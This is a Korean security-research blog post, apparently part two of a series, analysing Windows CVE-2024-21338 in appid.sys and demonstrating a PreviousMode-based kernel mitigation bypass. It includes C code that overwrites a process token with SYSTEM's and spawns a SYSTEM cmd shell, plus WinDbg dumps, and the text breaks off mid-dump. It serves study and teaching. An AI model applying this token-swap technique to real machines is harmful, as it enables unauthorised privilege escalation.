  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2025-01-12 19:00" pubdate>
      2025 1 12 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.9k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      57
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (Ko)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p>
<p><strong>Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &#x2190; Now</strong></p>
<hr>
<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, L0ch&#xC785;&#xB2C8;&#xB2E4;!</p>
<p>&#xC9C0;&#xB09C; &#xB2EC; Windows Kernel Mitigation&#xC744; &#xC18C;&#xAC1C;&#xD558;&#xB294; Part 1&#xC5D0; &#xC774;&#xC5B4; Part 2&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; kCFG &#xC6B0;&#xD68C;&#xC5D0;  &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCFC;&#xAC74;&#xB370;&#xC694;, 2024&#xB144; 2&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB358; appid.sys&#xC758; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810; CVE-2024-21338&#xC744; &#xBD84;&#xC11D;&#xD558;&#xBA70; kCFG&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC138; &#xAC00;&#xC9C0; post-exploitation technique&#xC5D0; &#xB300;&#xD574; &#xC18C;&#xAC1C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<h2 id="CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference"><a href="#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference" class="headerlink" title="CVE-2024-21338 - appid.sys Untrusted Pointer Dereference"></a>CVE-2024-21338 - appid.sys Untrusted Pointer Dereference</h2><blockquote>
<p>&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xBC0F; exploit&#xC740; Windows 23H2 build 22631.2861 (2023&#xB144; 12&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC801;&#xC6A9; &#xBC84;&#xC804;) &#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
</blockquote>
<p>CVE-2024-21338 &#xCDE8;&#xC57D;&#xC810; &#xC790;&#xCCB4;&#xB294; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! </p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%201.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>appid.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xC628; I/O Reqeust&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;, IOCTL Code&#xAC00; <code>0x22A018</code>&#xC778; &#xACBD;&#xC6B0; <code>AipSmartHashImageFile</code> &#xD568;&#xC218;&#xB97C; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xBC84;&#xD37C;&#xC778; SystemBuffer&#xB97C; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%202.png" srcset="/img/loading.gif" alt="image.png"></p>
<p><code>AipSmartHashImageFile</code> &#xD568;&#xC218;&#xB294; &#xC774;&#xD6C4; <code>AppHashComputeFileHashesInternal</code>, <code>AppHashComputeImageHashInternal</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC744; &#xD1B5;&#xD574; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>AppHashComputeImageHashInternal</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>SystemBuffer+0x16</code> &#xC624;&#xD504;&#xC14B;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>&#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; SystemBuffer&#xB97C; &#xCEE4;&#xB110; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xBBC0;&#xB85C;, &#xC720;&#xC800;&#xB294; &#xC784;&#xC758;&#xC758; &#xCF5C;&#xBC31; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.(&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;) &#xAC70;&#xAE30;&#xC5D0;, &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; rcx&#xB97C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xC8FC;&#xC18C;(&#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;) &#xAE4C;&#xC9C0; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC8E0;.</p>
<p>&#xC790;&#xC138;&#xD55C; &#xBD84;&#xC11D; &#xBC0F; PoC&#xB294; &#xC544;&#xB798; &#xB808;&#xD37C;&#xB7F0;&#xC2A4; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;!</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp">https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/">https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/</a></li>
</ul>
<p>&#xC774;&#xC81C; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB410;&#xC9C0;&#xB9CC;, &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0; &#xAD6C;&#xC131;&#xD55C; &#xC258;&#xCF54;&#xB4DC;&#xB098; ROP &#xAC00;&#xC82F; &#xB4F1;&#xC744; &#xD65C;&#xC6A9;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.  <a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kCFG-Kernel-Control-Flow-Guard">part1</a>&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774;</p>
<ul>
<li>CPU&#xAC00; Supervisor Mode(ring 0) &#xAD8C;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xB79C;&#xB4DC;(ring 3)&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD558;&#xB294; SMEP</li>
<li>&#xBE44;&#xD2B8;&#xB9F5;&#xC5D0; &#xB4F1;&#xB85D;&#xB41C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xAC00; &#xC544;&#xB2C8;&#xBA74; &#xC608;&#xC678;&#xB97C; throw&#xD574; <code>KERNEL_SECURITY_CHECK_FAILURE</code> &#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; kCFG</li>
</ul>
<p>&#xC704; &#xB450; &#xAC00;&#xC9C0;&#xC758; mitgation&#xC758; &#xC874;&#xC7AC; &#xB54C;&#xBB38;&#xC774;&#xC8E0;. SMEP&#xC740; bypass &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC6B0;&#xD68C;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xB3C4; &#xACB0;&#xAD6D; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xCF54;&#xB4DC;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; kCFG&#xC5D0;&#xC11C; &#xB9C9;&#xD600;&#xBC84;&#xB9AC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>Token Swapping&#xC744; &#xD1B5;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC778; &#xCEE4;&#xB110; Exploit&#xC740; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC77D;&#xAE30; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD55C;&#xB370;&#xC694;, kCFG&#xB97C; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xCEE4;&#xB110; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; Full Arbitrary Kernel Read/Write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294; &#xC138; &#xAC00;&#xC9C0; Exploit Tech&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ol>
<li>PreviousMode</li>
<li>SeDebugPrigvileges</li>
<li>I/O Ring Buffer</li>
</ol>
<p><del>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC704; &#xC138; &#xAC00;&#xC9C0; &#xAE30;&#xBC95;&#xC744; &#xC18C;&#xAC1C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;</del> &#xB9C8;&#xAC10; &#xC774;&#xC288;&#xB85C;,, &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; PreviouMode&#xB97C; &#xC774;&#xC6A9;&#xD55C; exploit&#xB9CC; &#xC18C;&#xAC1C;&#xD558;&#xACE0;, &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; SeDebugPrivileges&#xC640; I/O Ring Buffer&#xB97C; &#xC774;&#xC6A9;&#xD55C; Exploit&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%204.png" srcset="/img/loading.gif" alt="image.png"></p>
<h2 id="EXP-1-PreviousMode"><a href="#EXP-1-PreviousMode" class="headerlink" title="EXP 1 - PreviousMode"></a>EXP 1 - PreviousMode</h2><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; PreviousMode &#xBCC0;&#xC870;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode">PreviousMode</a>&#xB294; KTHREAD &#xAD6C;&#xC870;&#xCCB4; &#xD544;&#xB4DC;&#xB85C;, &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; <strong>Nt</strong> &#xB610;&#xB294; <strong>Zw</strong> &#xBC84;&#xC804;&#xC758; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4; &#xB8E8;&#xD2F4;&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xACBD;&#xC6B0; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C;&#xBD80;&#xD130; &#xC654;&#xC74C;&#xC744; &#xC54C;&#xB9AC;&#xB294; &#xD50C;&#xB798;&#xADF8; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. PreviousMode &#xAC12;&#xC774; 1&#xC774;&#xBA74; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC; &#xAC1D;&#xCCB4;&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xACE0;, 0&#xC774;&#xBA74; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC8E0;. &#xC774;&#xB294; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xC628; &#xAC1D;&#xCCB4;&#xC758; &#xCEE4;&#xB110; &#xC811;&#xADFC;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. </p>
<p>&#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; PrevousMode&#xB97C; 0&#xC73C;&#xB85C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; <code>NtWriteVirtualMemory</code>&#xB098; <code>ReadProcessMemory</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; RW &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC774;&#xD574;&#xB97C; &#xB3D5;&#xAE30; &#xC704;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xC640; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;!</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span>

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}
<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
	PVOID KTHREAD = <span class="hljs-literal">NULL</span>;
	PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;
	PVOID EPROCESS = <span class="hljs-literal">NULL</span>;

	ULONG dwbytes = <span class="hljs-number">0</span>;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	<span class="hljs-comment">// [1]</span>
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;KTHREAD, pid, hThread);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;EPROCESS, pid, hProc);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);

	GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);

	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;modify previousmode in windbg and press any button..\n&quot;</span>);
	getch();

	<span class="hljs-comment">// [2]</span>
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);

	<span class="hljs-comment">// [3]</span>
	system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);
	
}</code></pre>
<blockquote>
<p>&#xC804;&#xCCB4; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; : <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c</a></p>
</blockquote>
<p>&#xC704; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p>
<ol>
<li><code>NtQuerySystemInformation</code> API&#xB97C; &#xD1B5;&#xD574; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C; leak </li>
<li>&#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD1A0;&#xD070;&#xAC12;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; overwrite</li>
<li>&#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC758; cmd &#xC2A4;&#xD3F0;</li>
</ol>
<p>&#xC815;&#xC0C1;&#xC801;&#xC778; &#xC2E4;&#xD589;&#xC774;&#xB77C;&#xBA74; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; <code>pNtWriteVirtualMemory</code>&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; RW&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xBB34; &#xC77C;&#xB3C4; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;..&#xB9CC;! &#xC6B0;&#xB9B0; &#xC774;&#xC81C; <code>pNtWriteVirtualMemory</code>&#xD638;&#xCD9C; &#xC804; &#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; PreviouMode&#xB97C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560;&#xAC81;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%205.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>&#xC2E4;&#xD589;&#xD558;&#xBA74; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; KTHREAD/EPROCESS &#xC8FC;&#xC18C;&#xC640; SYSTEM &#xD504;&#xB85C;&#xC138;&#xC2A4; EPROCESS &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; &#xBCF5;&#xC0AC;&#xD574;&#xB450;&#xACE0; windbg&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER
   +<span class="hljs-number">0x018</span> SListFaultAddress : (null) 
   +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>
   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void
   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void
   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void
   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>
   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>
   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void
   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT
...
   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS
   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX
   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">1</span> <span class="hljs-string">&apos;&apos;</span>
   +0x233 BasePriority     : 8 &apos;&apos;</code></pre>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%206.png" srcset="/img/loading.gif" alt="image.png"></p>
<p><code>KTHREAD+0x232</code> &#xC704;&#xCE58;&#xC5D0; PreviouMode&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC774;&#xB2C8; PreviouMode&#xAC00; 1&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;. &#xC774;&#xC81C; windbg&#xC758; Memory &#xCC3D;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xAC12;&#xC744; 0&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%207.png" srcset="/img/loading.gif" alt="image.png"></p>
<pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER
   +<span class="hljs-number">0x018</span> SListFaultAddress : (null) 
   +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>
   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void
   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void
   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void
   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>
   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>
   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void
   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT
...
   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS
